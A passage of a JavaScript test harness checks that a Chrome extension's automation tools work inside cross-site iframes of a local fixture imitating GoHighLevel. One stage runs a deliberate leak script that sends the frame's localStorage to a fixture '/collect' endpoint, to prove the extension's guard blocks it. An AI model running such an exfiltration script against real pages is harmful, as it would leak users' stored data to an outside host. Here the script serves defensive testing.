// @ts-check
// frames-suite (standalone harness): the proof that Vyre for Chrome works on the app the way GoHighLevel really renders it.
// GoHighLevel's Workflows UI (list and builder) is an IFRAME on another site than the shell, and its network traffic belongs to that
// frame. The fixture (bench/fixtures/ghl-shell.html, ghl-app.html, frames-world.mjs) is built the same way: a shell on a.localhost embeds
// the app on b.localhost, which stays blank until the shell posts it {type:"auth", token}, calls its own API with a bearer header and
// nests an email editor from c.localhost; a live-chat frame arrives 1.5 s after load, a ticker frame navigates, a same-origin frame sits
// in the nav and a sandboxed help panel cannot be read. Chrome treats the four hostnames as four sites (--site-per-process), so each is
// its own process. Everything goes through the MCP tools of the built release, on a real Chrome with the real extension.
//
//   node standalone/harness/frames-suite.mjs [--out file] [--chrome path] [--headless new|false]
//
// Stages (each names what it proves; a failure names the step that failed, the last result, and the capability that is missing):
//   a frames_listed          chrome_frames lists 3+ frames; all readable except the sandboxed one, which snapshot NAMES as not readable
//   b snapshot_iframe_app    chrome_snapshot shows the iframe app's controls with frame + origin, not only the shell nav
//   - app_needs_parent       the app opened as a top-level page shows only "Waiting for parent" (the handshake is real)
//   c act_fill_wait          click a control inside the iframe app, fill a field in the nested frame, wait for the late frame's control
//   d ghl_create_workflow    chrome_ghl run create-workflow end to end in the iframe builder; /__state has the workflow with 2 steps
//   e batch_across_frames    one chrome_batch spanning frames, one of which navigates mid-batch
//   f eval_in_frame          chrome_eval with `frame` reads the iframe's title; a leak of localStorage to a fresh origin is held, the frame's own API is not
//   g net_and_api            chrome_net list tags the iframe's /api/workflows requests; chrome_api learn/catalog/call work from that frame
//   h send_hold              a "Send Email" TILE in the builder drawer is not held; a real "Send" submit is held (and sent once when released)
//   i robust_flags           the same flow with a slow route, a "what's new" popup, an unsaved guard and a re-rendering toolbar, all in the frame
// Timings recorded: snapshot, click, fill, the create-workflow flow. Never run this on a person's machine.
//
// Chrome here is always launched through launchChrome (spike/harness/lib.mjs), which spreads CHROME_SAFE (lib/chrome-flags).
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync } from "node:child_process";
import { hostManifest, launchChrome, parseArgs, prepareExtension, registerHost, resolveChrome, sleep, stats, stepSummary, stopProcess } from "../../spike/harness/lib.mjs";
import { startFixtureServer } from "../../bench/fixtures/server.mjs";
import { FRAMES_BATCH, FRAMES_SHELL_PATH, FRAMES_WORKFLOW } from "../../bench/scenarios.mjs";
import { build } from "../build-release.mjs";

const T0 = performance.now();
const log = (/** @type {string} */ m) => console.error(`[frames-suite +${Math.round(performance.now() - T0)}ms] ${m}`);
/** @template T @param {Promise<T>} p @param {number} ms @param {() => string} what @returns {Promise<T>} */
const within = (p, ms, what) => new Promise((res, rej) => { const t = setTimeout(() => rej(new Error(`${what()} took longer than ${ms} ms`)), ms); p.then(v => { clearTimeout(t); res(v); }, e => { clearTimeout(t); rej(e); }); });
const short = (/** @type {any} */ v, n = 500) => { try { return (typeof v === "string" ? v : JSON.stringify(v)).slice(0, n); } catch { return String(v).slice(0, n); } };
/** The value of a chrome_eval result, whichever way the tool spells it. @param {any} r */
const val = r => (r && typeof r === "object" && !Array.isArray(r) ? ("value" in r ? r.value : "result" in r ? r.result : r) : r);
/** A capability the run needs from the extension: false throws a message that names it. @param {any} cond @param {string} capability @param {string} detail */
const need = (cond, capability, detail) => { if (!cond) throw new Error(`MISSING CAPABILITY [${capability}]: ${detail}`); };

/** What a failed batch or flow says, short but complete about the step that failed. @param {any} r */
const brief = r => { try { const last = Array.isArray(r.results) ? r.results[r.results.length - 1] : undefined; return JSON.stringify({ ok: r.ok, done: r.done, failedAt: r.failedAt, code: r.code, why: r.why, failed: r.failed, stepFrames: r.stepFrames, last }).slice(0, 1500); } catch { return String(r).slice(0, 500); } };

/** A minimal MCP client over a child's stdio, with per-call logging and the last calls kept for a failure report. @param {import("node:child_process").ChildProcess} child */
function mcpClient(child) {
  let n = 0, calls = 0, buf = ""; const waiting = new Map();
  /** @type {Array<{ n: number, name: string, args: string, ms: number, error?: string, result: string }>} */ const recent = [];
  /** @type {any} */ const c = child;
  c.stdout.on("data", (/** @type {any} */ d) => { buf += d; let i; while ((i = buf.indexOf("\n")) >= 0) { const line = buf.slice(0, i); buf = buf.slice(i + 1); if (!line.trim()) continue; try { const m = JSON.parse(line); waiting.get(m.id)?.(m); } catch { /* not ours */ } } });
  const rpc = (/** @type {string} */ method, /** @type {any} */ params, ms = 60_000) => within(new Promise(res => { const id = ++n; waiting.set(id, res); c.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n"); }), ms, () => `mcp ${method}`);
  /** A tool call: the parsed JSON result, or throws with the tool's error text. */
  const call = async (/** @type {string} */ name, /** @type {any} */ args = {}, ms = 60_000) => {
    const k = ++calls, t = performance.now();
    log(`> #${k} ${name} ${short(args, 160)}`);
    const rec = { n: k, name, args: short(args, 200), ms: 0, result: "" };
    recent.push(rec); if (recent.length > 12) recent.shift();
    try {
      const r = /** @type {any} */ (await rpc("tools/call", { name, arguments: args }, ms));
      rec.ms = Math.round(performance.now() - t);
      if (r.error) { rec.error = `rpc ${r.error.code} ${r.error.message}`; throw new Error(`${name}: rpc ${r.error.code} ${r.error.message}`); }
      const text = (r.result.content.find((/** @type {any} */ x) => x.type === "text") || {}).text || "null";
      rec.result = short(text, 400);
      if (r.result.isError) { rec.error = short(text, 300); throw Object.assign(new Error(`${name}: ${text.slice(0, 500)}`), { text }); }
      log(`< #${k} ${name} ${rec.ms}ms`);
      try { return JSON.parse(text); } catch { return text; }
    } catch (e) { rec.ms = rec.ms || Math.round(performance.now() - t); rec.error = rec.error || String(/** @type {Error} */ (e).message).slice(0, 300); log(`! #${k} ${name} ${rec.ms}ms ${rec.error}`); throw e; }
  };
  return { rpc, call, recent };
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const headless = args.headless === "false" ? false : typeof args.headless === "string" ? args.headless : "new";
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-fs-"));
  const udd = path.join(tmp, "profile"); fs.mkdirSync(udd);
  const data = path.join(tmp, "data");
  /** @type {Record<string, any>} */ const out = { tool: "chrome-frames-suite", os: `${process.platform}-${os.arch()}`, node: process.version, headless, stages: {}, timings: {}, at: new Date().toISOString() };
  const writeOut = () => { if (typeof args.out === "string") { try { fs.mkdirSync(path.dirname(path.resolve(args.out)), { recursive: true }); fs.writeFileSync(args.out, JSON.stringify(out, null, 2)); } catch { /* best effort */ } } };
  setTimeout(() => { out.fatal = out.fatal || "watchdog: still running after 660 s"; console.log(JSON.stringify(out, null, 2)); writeOut(); process.exit(3); }, 660_000).unref();
  /** @type {any} */ let chromeProc = null, fixture = null, mcp = null;
  const cleanups = /** @type {Array<()=>void>} */ ([]);

  // ---- stages and steps: a failure names the stage, the step it was on, the last call and what it returned
  let curStage = "", curStep = "";
  /** Name the step being done; a failure reports it. @template T @param {string} label @param {() => Promise<T>} fn @returns {Promise<T>} */
  const step = async (label, fn) => { curStep = label; log(`  step: ${label}`); return fn(); };
  /** @param {string} name @param {() => Promise<any>} fn @param {number} [budgetMs] */
  const stage = async (name, fn, budgetMs = 90_000) => {
    const t = performance.now(); curStage = name; curStep = "start"; log(`stage ${name}`);
    try { out.stages[name] = { ok: true, ...(await within(fn(), budgetMs, () => `stage ${name} (at step "${curStep}")`)), ms: Math.round(performance.now() - t) }; log(`stage ${name} ok`); return true; }
    catch (e) {
      const last = mcp && mcp.recent[mcp.recent.length - 1];
      const m = `step "${curStep}": ${String(/** @type {Error} */ (e).message || e).slice(0, 700)}${last ? `; last call #${last.n} ${last.name} ${last.args} -> ${last.error ? "ERROR " + last.error : last.result.slice(0, 300)}` : ""}`;
      log(`stage ${name} FAILED: ${m.slice(0, 500)}`);
      out.stages[name] = { ok: false, error: m.slice(0, 1600), lastCalls: mcp ? mcp.recent.slice(-6) : [], ms: Math.round(performance.now() - t) };
      return false;
    }
  };
  /** Time n runs of a call. @param {number} n @param {()=>Promise<any>} fn */
  const timed = async (n, fn) => { const xs = []; for (let i = 0; i < n; i++) { const t = performance.now(); await fn(); xs.push(performance.now() - t); } return stats(xs); };
  const state = async () => /** @type {any} */ ((await (await fetch(`${fixture.url}/__state`)).json()).data);
  /** Poll a condition on the fixture's state (the page's request reaches the server a moment later). @param {(s:any)=>any} pick @param {(v:any)=>boolean} ok @param {string} what */
  const stateWhere = async (pick, ok, what) => { const end = Date.now() + 8000; let v; for (;;) { v = pick(await state()); if (ok(v)) return v; if (Date.now() > end) throw new Error(`the fixture never saw ${what}; last value ${short(v, 300)}`); await sleep(150); } };

  try {
    log("build the release");
    const rel = build({ out: path.join(tmp, "release") });
    out.release = { version: rel.version, sha256: rel.sha };
    const home = path.join(tmp, "home"); fs.mkdirSync(home);
    const env = { ...process.env, HOME: home, USERPROFILE: home, VYRE_CHROME_HOME: data };
    const cliInstall = path.join(rel.dir, "standalone", "cli.mjs");
    const app = path.join(data, "app");
    const cli = path.join(app, "standalone", "cli.mjs");
    log("cli install");
    const inst = spawnSync(process.execPath, [cliInstall, "install", "--browsers", "chrome", "--no-wait"], { env, encoding: "utf8" });
    out.install = { status: inst.status, stderr: (inst.stderr || "").slice(0, 300) };
    if (inst.status !== 0) throw new Error(`install failed: ${inst.stderr}`);
    const ext = prepareExtension(path.join(app, "extension"), path.join(tmp, "extension"));
    out.extensionId = ext.id;
    const launcher = path.join(app, "native-host", process.platform === "win32" ? "run-host.cmd" : "run-host.sh");
    cleanups.push(registerHost({ manifestObj: hostManifest({ wrapper: launcher, id: ext.id }), dir: tmp, userDataDir: udd }));

    fixture = await startFixtureServer();
    const shellUrl = `${fixture.site("shell")}${FRAMES_SHELL_PATH}`;
    out.fixture = { shell: shellUrl, app: fixture.site("app"), widgets: fixture.site("widgets"), fresh: fixture.site("fresh") };
    // What a person on a white-label GoHighLevel domain does once: list the shell and the app host as GoHighLevel's (a *.localhost name
    // is not GoHighLevel's own). This harness has no person to ask, so a held send may be released without a question.
    for (const h of ["a.localhost", "b.localhost"]) spawnSync(process.execPath, [cli, "config", "ghl-host", h], { env, encoding: "utf8" });
    spawnSync(process.execPath, [cli, "config", "confirm-sends", "off"], { env, encoding: "utf8" });
    const child = spawn(process.execPath, [cli, "mcp"], { env, stdio: ["pipe", "pipe", "pipe"] });
    mcp = mcpClient(child);
    child.stderr.on("data", d => { const s = String(d).trim(); if (s) log(`mcp: ${s.slice(0, 200)}`); });
    cleanups.push(() => { try { child.kill(); } catch { /* gone */ } });
    await stage("mcp_initialize", async () => { const r = /** @type {any} */ (await mcp.rpc("initialize", { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "harness", version: "1" } })); const l = /** @type {any} */ (await mcp.rpc("tools/list", {})); const names = l.result.tools.map((/** @type {any} */ t) => t.name); need(["chrome_frames", "chrome_snapshot", "chrome_act", "chrome_fill", "chrome_wait", "chrome_eval", "chrome_batch", "chrome_net", "chrome_api", "chrome_ghl", "chrome_send"].every(n => names.includes(n)), "tools", `missing tools: ${["chrome_frames", "chrome_snapshot", "chrome_act", "chrome_fill", "chrome_wait", "chrome_eval", "chrome_batch", "chrome_net", "chrome_api", "chrome_ghl", "chrome_send"].filter(n => !names.includes(n)).join(", ")}`); return { server: r.result.serverInfo, tools: names.length }; });

    const chrome = resolveChrome({ chrome: typeof args.chrome === "string" ? args.chrome : undefined });
    out.chrome = chrome.version;
    // --site-per-process: each site (a, b, c, d .localhost) is its own process, as GoHighLevel's app is. A fixed window size so the layout is the same everywhere.
    const launched = launchChrome({ chrome: chrome.path, userDataDir: udd, url: "about:blank", extraArgs: [`--load-extension=${ext.dir}`, `--disable-extensions-except=${ext.dir}`, "--site-per-process", "--window-size=1280,900"], headless, logFile: path.join(tmp, "chrome.log") });
    chromeProc = launched.child; log("chrome launched");

    const connected = await stage("connected", async () => {
      const end = Date.now() + 45_000;
      for (;;) { const s = await mcp.call("chrome_status", {}); if (s.connected) return { extension: s.extension && { protocol: s.extension.protocol, version: s.extension.version } }; if (Date.now() > end) throw new Error("the extension never connected: " + short(s, 300)); await sleep(250); }
    });
    if (connected) {
      /** @type {any} */ let tab;
      const tabIdOf = (/** @type {any} */ r) => r.id ?? (r.tab && r.tab.id);
      /** Open the shell in the tab (fresh: the app reboots, the late frame is re-added, the ticker resets) and wait until the app has drawn. @param {string} [url] @param {{ noApp?: boolean }} [o] */
      const fresh = async (url = shellUrl, o = {}) => {
        await step("navigate the tab to the shell", () => mcp.call("chrome_tabs", { action: "navigate", tab, url }));
        if (!o.noApp) await step("wait for the app's Create Workflow control (inside the iframe)", async () => { const t = performance.now(); await mcp.call("chrome_wait", { tab, selector: { name: "Create Workflow", identifier: "create-workflow" }, timeoutMs: 20_000 }, 30_000); return Math.round(performance.now() - t); });
      };
      await stage("open_shell", async () => { const r = await mcp.call("chrome_tabs", { action: "use", url: shellUrl, openIfMissing: true }); tab = tabIdOf(r); need(tab !== undefined, "tabs.use", "no tab id came back: " + short(r, 200)); return { tab }; });

      // ---------------------------------------------------------------- (a) frames listed
      /** @type {any[]} */ let frameRows = [];
      await stage("frames_listed", async () => {
        const end = Date.now() + 25_000;
        for (;;) {
          const r = await step("chrome_frames list", () => mcp.call("chrome_frames", { action: "list", tab }));
          frameRows = Array.isArray(r) ? r : (r.frames || []);
          // Shell, app, nested editor, same-origin, sandboxed, ticker and (after 1.5 s) the late chat.
          if (frameRows.length >= 7 && frameRows.some(f => /\/late/.test(String(f.url || "")))) break;
          if (Date.now() > end) break;
          await sleep(400);
        }
        need(frameRows.length >= 3, "frames.list", `only ${frameRows.length} frame(s) listed, wanted the shell, the app and the nested editor at least: ${short(frameRows.map(f => ({ i: f.index, o: f.origin, u: f.url, r: f.readable })), 600)}`);
        need(frameRows.length >= 7, "frames.list", `${frameRows.length} frames listed, wanted 7 (shell, app, nested editor, same-origin, sandboxed, ticker, late chat): ${short(frameRows.map(f => f.url), 600)}`);
        need(frameRows.some(f => /\/email-editor/.test(String(f.url || "")) && f.depth >= 2), "frames.list", "the editor nested inside the app is not listed at depth 2 (nested frames are not walked)");
        need(frameRows.some(f => /\/late/.test(String(f.url || ""))), "frames.list", "the late frame (added 1.5 s after load) is not listed");
        const bad = frameRows.filter(f => f.readable === false);
        need(bad.length === 1, "frames.list", `exactly the sandboxed frame should be not readable; not readable: ${short(bad, 400)}`);
        need(/\/sandboxed/.test(String(bad[0].url || "")) || /sandbox|opaque|null/i.test(String(bad[0].origin || "") + String(bad[0].why || "")), "frames.list", `the one unreadable frame is not the sandboxed one: ${short(bad[0], 300)}`);
        const probe = await step("chrome_frames probe", () => mcp.call("chrome_frames", { action: "probe", tab }));
        const prow = Array.isArray(probe) ? probe : (probe.frames || []);
        need(prow.filter((/** @type {any} */ f) => f.readable !== false && f.title).length >= 5, "frames.probe", `probe read the title of fewer than 5 readable frames: ${short(prow.map((/** @type {any} */ f) => [f.index, f.readable, f.title]), 500)}`);
        const snap = await step("chrome_snapshot names the unreadable frame", () => mcp.call("chrome_snapshot", { tab }));
        need(/\b1 frames? not readable\b/i.test(String(snap.text || "")), "snapshot.notReadable", `the snapshot text does not say "1 frame not readable": ${short(String(snap.text || "").slice(0, 300))}`);
        need(Array.isArray(snap.notReadable) && snap.notReadable.length === 1, "snapshot.notReadable", `snapshot.notReadable is ${short(snap.notReadable)}, wanted one frame`);
        need(!(snap.controls || []).some((/** @type {any} */ c) => /contact support/i.test(String(c.name || ""))), "snapshot", "a control of the sandboxed frame is listed, so it was read (it must not be)");
        return { frames: frameRows.length, readable: frameRows.filter(f => f.readable !== false).length, notReadable: bad.map(f => f.origin || f.url), depths: frameRows.map(f => f.depth), snapshotSays: /(\d+ frames? not readable[^.]*)\./i.exec(String(snap.text || ""))?.[1] };
      });

      // ---------------------------------------------------------------- (b) snapshot shows the iframe app's controls
      await stage("snapshot_iframe_app", async () => {
        let snap = /** @type {any} */ (null);
        const end = Date.now() + 15_000;
        do { snap = await step("chrome_snapshot", () => mcp.call("chrome_snapshot", { tab })); if ((snap.controls || []).some((/** @type {any} */ c) => /create workflow/i.test(String(c.name || "")))) break; await sleep(300); } while (Date.now() < end);
        const frames = snap.frames || [];
        const originOf = (/** @type {any} */ c) => c.frameOrigin || (frames.find((/** @type {any} */ f) => f.index === c.frame) || {}).origin || "";
        const controls = /** @type {any[]} */ (snap.controls || []);
        const shellNav = controls.find(c => /^automation$/i.test(String(c.name || "")));
        need(shellNav && (shellNav.frame ?? 0) === 0, "snapshot", `the shell's left nav "Automation" is not listed in frame 0: ${short(shellNav)}`);
        const create = controls.find(c => /^create workflow$/i.test(String(c.name || "")));
        need(create, "snapshot.frames", `the iframe app's "Create Workflow" is not in the snapshot (${controls.length} controls, from frames ${short([...new Set(controls.map(c => c.frame ?? 0))])}); the snapshot reads only the top page`);
        need((create.frame ?? 0) > 0, "snapshot.frames", `"Create Workflow" is listed with frame ${create.frame ?? 0}: it carries no frame`);
        need(/^http:\/\/b\.localhost:\d+$/.test(originOf(create)), "snapshot.frames", `"Create Workflow" carries frame origin ${JSON.stringify(originOf(create))}, wanted the app's http://b.localhost:PORT`);
        const editor = controls.find(c => /email editor body/i.test(String(c.name || "")));
        need(editor && /^http:\/\/c\.localhost:\d+$/.test(originOf(editor)), "snapshot.frames", `the nested editor's field is not listed with the c.localhost origin: ${short(editor)}`);
        const byFrame = controls.reduce((/** @type {Record<string, number>} */ m, c) => { const k = originOf(c) || "top"; m[k] = (m[k] || 0) + 1; return m; }, {});
        out.timings.snapshot = await step("time chrome_snapshot", () => timed(5, () => mcp.call("chrome_snapshot", { tab })));
        return { controls: controls.length, byFrameOrigin: byFrame, createWorkflow: { frame: create.frame, origin: originOf(create), identifier: create.identifier }, latency: out.timings.snapshot };
      });

      // The app opened as a top-level page has no parent to hand it the token: it must show nothing but a waiting note.
      await stage("app_needs_parent", async () => {
        await step("open the app's own URL as a top-level page", () => mcp.call("chrome_tabs", { action: "navigate", tab, url: `${fixture.site("app")}/automation/workflows` }));
        await sleep(1500);
        const snap = await step("chrome_snapshot", () => mcp.call("chrome_snapshot", { tab }));
        need(/Waiting for parent/i.test(String(snap.text || "")), "fixture", `the app opened alone does not say it is waiting for its parent: ${short(String(snap.text || ""), 200)}`);
        need(!(snap.controls || []).some((/** @type {any} */ c) => /create workflow/i.test(String(c.name || ""))), "fixture", "the app drew its controls without the shell's auth message");
        return { text: String(snap.text || "").slice(0, 60), controls: (snap.controls || []).length };
      });

      // ---------------------------------------------------------------- (c) act inside the iframe, fill in the nested frame, wait for the late frame
      await stage("act_fill_wait", async () => {
        await fresh(shellUrl, { noApp: true });
        // The late frame is added 1.5 s after load: ask for its control right away and time how long the wait takes.
        const tLate = performance.now();
        const lateP = step("wait for the late frame's control (Open chat widget)", () => mcp.call("chrome_wait", { tab, selector: { name: "Open chat widget", identifier: "open-chat" }, timeoutMs: 20_000 }, 30_000));
        const late = await lateP; const lateMs = Math.round(performance.now() - tLate);
        need(late && late.ok !== false && late.found !== false, "wait.frames", `chrome_wait did not report the late frame's control: ${short(late)}`);
        await step("wait for the app to draw", () => mcp.call("chrome_wait", { tab, selector: { name: "Create Workflow", identifier: "create-workflow" }, timeoutMs: 20_000 }, 30_000));
        // Click inside the iframe app (its Create Workflow opens a chooser), then close the chooser with its own Cancel.
        const click = await step("click Create Workflow inside the iframe app", () => mcp.call("chrome_act", { tab, selector: { name: "Create Workflow", identifier: "create-workflow" }, kind: "click" }));
        need(click.ok !== false && !click.held, "act.frames", `the click inside the iframe app failed: ${short(click)}`);
        const tr = click.trace || {};
        need(typeof tr.frame === "number" ? tr.frame > 0 : true, "act.frames", `the click ran in frame ${tr.frame}, not in the app's frame`);
        const opened = await step("the chooser opened (read inside the iframe)", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "!document.getElementById('chooser').classList.contains('hidden')" }));
        need(val(opened) === true, "act.frames", `the click on Create Workflow did not reach the app: chooser open is ${short(opened)}`);
        await step("click Cancel in the chooser", () => mcp.call("chrome_act", { tab, selector: { name: "Cancel", identifier: "chooser-cancel" }, kind: "click" }));
        // Fill a field inside the NESTED frame (site C, inside the app on site B) and press its Save.
        const fill = await step("fill the nested editor's field (frame two levels down)", () => mcp.call("chrome_fill", { tab, fields: [{ selector: { name: "Email editor body", identifier: "editor-body" }, value: "hello from kit" }] }));
        need(fill.ok !== false, "fill.frames", `the fill inside the nested frame failed: ${short(fill)}`);
        const save = await step("click Save design in the nested editor", () => mcp.call("chrome_act", { tab, selector: { name: "Save design", identifier: "editor-save" }, kind: "click" }));
        need(save.ok !== false && !save.held, "act.frames", `the Save click in the nested frame failed: ${short(save)}`);
        const saved = await step("the fixture saw the nested editor's text", () => stateWhere(s => s.editorSaves, v => v.length >= 1, "the nested editor's save"));
        need(saved[saved.length - 1].body === "hello from kit", "fill.frames", `the nested editor saved ${JSON.stringify(saved[saved.length - 1])}, wanted "hello from kit": the fill did not reach the nested frame`);
        // Time a click and a fill inside the iframe app.
        out.timings.click = await step("time clicks inside the iframe", () => timed(5, () => mcp.call("chrome_act", { tab, selector: { name: "Search workflows", identifier: "workflow-search" }, kind: "click" })));
        out.timings.fill = await step("time fills inside the iframe", () => timed(5, () => mcp.call("chrome_fill", { tab, fields: [{ selector: { name: "Search workflows", identifier: "workflow-search" }, value: "x" }] })));
        return { lateFrameWaitMs: lateMs, clickTrace: tr, editorSaved: saved[saved.length - 1], click: out.timings.click, fill: out.timings.fill };
      });

      // ---------------------------------------------------------------- (d) the create-workflow flow in the iframe builder
      await stage("ghl_create_workflow", async () => {
        await fresh();
        const before = (await state()).workflows.length;
        const t0 = performance.now();
        const run = await step("chrome_ghl run create-workflow", () => mcp.call("chrome_ghl", { action: "run", tab, flow: "create-workflow", params: FRAMES_WORKFLOW }, 90_000));
        const ms = Math.round(performance.now() - t0);
        need(run.ok !== false, "ghl.run.frames", `the flow failed: ${brief(run)}`);
        const last = Array.isArray(run.results) ? run.results[run.results.length - 1] : undefined;
        const st = await step("the fixture has the workflow", () => stateWhere(s => s.workflows, v => v.length > before, "the created workflow"));
        const wf = st[st.length - 1];
        need(wf.name === FRAMES_WORKFLOW.name, "ghl.run.frames", `the workflow is named ${JSON.stringify(wf.name)}, wanted ${JSON.stringify(FRAMES_WORKFLOW.name)}: ${short(wf)}`);
        need(wf.trigger === "Contact Created", "ghl.run.frames", `the trigger is ${JSON.stringify(wf.trigger)}, wanted "Contact Created"`);
        need(Array.isArray(wf.actions) && wf.actions.length === 2, "ghl.run.frames", `the workflow has ${wf.actions && wf.actions.length} steps, wanted 2: ${short(wf.actions)}`);
        need(wf.actions[0].type === "Send Email" && /Welcome to Harlow Legal/.test(short(wf.actions[0])) && wf.actions[1].type === "Add Tag" && /new-lead/.test(short(wf.actions[1])), "ghl.run.frames", `the steps do not carry the config that was given: ${short(wf.actions)}`);
        need(last && last.saved === true && last.evidence && last.evidence.kind === "toast", "ghl.save.frames", `the save was not verified by the toast: last step ${short(last)}`);
        const frames = (run.stepFrames || []).map((/** @type {any} */ x) => x.frame);
        need(frames.length && frames.some((/** @type {number} */ f) => f > 0), "ghl.run.frames", `no step of the flow reports running in a child frame (stepFrames ${short(run.stepFrames)})`);
        out.timings.createWorkflowFlow = { ms, perStepMs: run.perStepMs, steps: run.steps };
        return { ms, steps: run.steps, perStepMs: run.perStepMs, workflow: { id: wf.id, name: wf.name, trigger: wf.trigger, steps: wf.actions.length }, saveEvidence: last.evidence, stepFrames: run.stepFrames && run.stepFrames.length };
      }, 120_000);

      // ---------------------------------------------------------------- (e) a batch across frames, one of which navigates mid-batch
      await stage("batch_across_frames", async () => {
        await fresh();
        await step("wait for the ticker frame's first page", () => mcp.call("chrome_wait", { tab, selector: { name: "Ticker one ack", identifier: "ticker-ack-1" }, timeoutMs: 10_000 }, 20_000));
        const acks0 = (await state()).acks.length;
        const steps = FRAMES_BATCH.map(s => ({ ...s, args: { ...s.args, tabId: tab } }));
        const t0 = performance.now();
        const r = await step("chrome_batch across frames", () => mcp.call("chrome_batch", { tab, steps }, 60_000));
        const ms = Math.round(performance.now() - t0);
        need(r.ok !== false, "batch.frames", `the batch failed at a step: ${brief(r)}`);
        const acks = await step("the ticker frame's second page was pressed", () => stateWhere(s => s.acks, v => v.length > acks0, "the click in the navigated ticker frame"));
        need(acks[acks.length - 1] === 2, "batch.frames", `the ticker ack was for page ${acks[acks.length - 1]}, wanted 2: the batch acted on the old page`);
        const saves = await stateWhere(s => s.editorSaves, v => v.some((/** @type {any} */ e) => e.body === "batch text for juno"), "the nested editor's text from the batch");
        const v = await mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "document.getElementById('workflow-search').value" });
        need(val(v) === "intake", "batch.frames", `the app's search box holds ${short(val(v))}, wanted "intake"`);
        const frames = (r.results || []).map((/** @type {any} */ x) => x && x.trace && x.trace.frame).filter((/** @type {any} */ f) => typeof f === "number");
        return { ms, steps: steps.length, frames, editorSaves: saves.length, acks };
      });

      // ---------------------------------------------------------------- (f) eval in the iframe; a leak is held, the frame's own API is not
      await stage("eval_in_frame", async () => {
        await fresh();
        const inTop = await step("eval in the top page", () => mcp.call("chrome_eval", { tab, expression: "document.title" }));
        const inApp = await step("eval in the iframe (frame: b.localhost)", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "document.title" }));
        need(val(inTop) === "Harlow Legal CRM", "eval.top", `the top page's title is ${short(val(inTop))}`);
        need(val(inApp) === "Workflows | Harlow Legal", "eval.frame", `chrome_eval with frame b.localhost returned ${short(val(inApp))}, wanted the iframe's own title "Workflows | Harlow Legal" (it ran in the top page?)`);
        const leakTo = `${fixture.site("fresh")}/collect?d=`;
        const before = (await state()).collected.length;
        const leak = await step("an eval inside the iframe sends localStorage to a fresh origin", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: `(async () => { localStorage.setItem('k', 'v'); try { await fetch(${JSON.stringify(leakTo)} + encodeURIComponent(JSON.stringify(localStorage))); } catch (e) {} new Image().src = ${JSON.stringify(leakTo)} + 'img'; return 1; })()` }));
        need(leak.held === true, "eval.frame.guard", `a script inside the iframe that sent storage to a fresh origin was not held: ${short(leak)} (the guard covers the top page only)`);
        await sleep(400);
        need((await state()).collected.length === before, "eval.frame.guard", `the fresh origin received ${(await state()).collected.length - before} request(s) from the held script`);
        const own = await step("the iframe's own API call is not held", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "window.__api('GET', '/api/workflows').then(function (r) { return r.status; })" }));
        need(!own.held && own.ok !== false && val(own) === 200, "eval.frame.guard", `the iframe's own API call was refused or failed: ${short(own)}`);
        return { titleTop: val(inTop), titleFrame: val(inApp), leakHeld: true, ownApiStatus: val(own) };
      });

      // ---------------------------------------------------------------- (g) network and API learning belong to the iframe
      await stage("net_and_api", async () => {
        await step("chrome_net start", () => mcp.call("chrome_net", { action: "start", tab }));
        await fresh();
        /** @type {any[]} */ let rows = [];
        const end = Date.now() + 10_000;
        for (;;) {
          const r = await step("chrome_net list", () => mcp.call("chrome_net", { action: "list", tab, limit: 200 }));
          rows = (r.requests || []).filter((/** @type {any} */ x) => /\/api\/workflows/.test(String(x.url || "")));
          if (rows.length) break;
          if (Date.now() > end) throw new Error(`no /api/workflows request was captured from the iframe app (buffer holds ${r.buffered ?? "?"}, listed ${r.count}); the network tool sees only the top page: ${short((r.requests || []).map((/** @type {any} */ x) => x.url), 300)}`);
          await sleep(300);
        }
        const row = rows[0];
        need(/^http:\/\/b\.localhost:\d+\//.test(String(row.url)), "net.frames", `the captured request is ${row.url}`);
        const tagKeys = Object.keys(row).filter(k => /frame|origin|target|session/i.test(k));
        need(tagKeys.length > 0, "net.frames", `a captured request carries no frame tag (keys: ${Object.keys(row).join(", ")}); it cannot be told from the shell's traffic`);
        const tagText = short(tagKeys.map(k => row[k]), 400);
        need(/b\.localhost/.test(tagText) || tagKeys.some(k => typeof row[k] === "number" && row[k] > 0), "net.frames", `the frame tag ${tagText} does not identify the iframe's origin (b.localhost) or a child frame`);
        const learn = await step("chrome_api learn", () => mcp.call("chrome_api", { action: "learn", tab }));
        need(learn.learned > 0 || (learn.entries || []).length, "api.learn.frames", `api.learn learned nothing from the iframe's traffic: ${short(learn)}`);
        const cat = await step("chrome_api catalog", () => mcp.call("chrome_api", { action: "catalog", tab }));
        const entries = /** @type {any[]} */ (cat.entries || []);
        const wfEntries = entries.filter(e => /\/api\/workflows/.test(short(e)) && /b\.localhost/.test(short(e)));
        need(wfEntries.length > 0, "api.catalog.frames", `the catalog has no workflows endpoint learned from the iframe (origins ${short(cat.origins)}, ${entries.length} entries)`);
        const getEntry = wfEntries.find(e => /^GET$/i.test(String(e.method))) || wfEntries[0];
        const known = (await state()).workflows;
        const call = await step("chrome_api call the learned workflows endpoint", () => mcp.call("chrome_api", { action: "call", tab, entry: getEntry.id, entryId: getEntry.id, args: {}, params: {} }));
        need(call.held !== true && call.ok !== false && (call.status === 200 || /200/.test(short(call))), "api.call.frames", `the learned call did not return 200: ${short(call)}`);
        need(!call.authNote, "api.call.frames", `the bearer token of the iframe's traffic was not found for the call: ${call.authNote}`);
        need((call.frame ?? 0) > 0 || /b\.localhost/.test(String(call.frameOrigin || "")), "api.call.frames", `the call did not run inside the iframe (result carries frame ${short(call.frame)} ${short(call.frameOrigin)}): ${short(call, 300)}`);
        need(!known.length || short(call, 4000).includes(known[0].name), "api.call.frames", `the call's body does not list the workflow "${known[0] && known[0].name}" the fixture holds: ${short(call, 300)}`);
        return { requests: rows.length, frameTag: Object.fromEntries(tagKeys.map(k => [k, row[k]])), learned: learn.learned, workflowEndpoints: wfEntries.length, call: { status: call.status, frame: call.frame, frameOrigin: call.frameOrigin } };
      });

      // ---------------------------------------------------------------- (h) a tile is not a send, a real Send is held
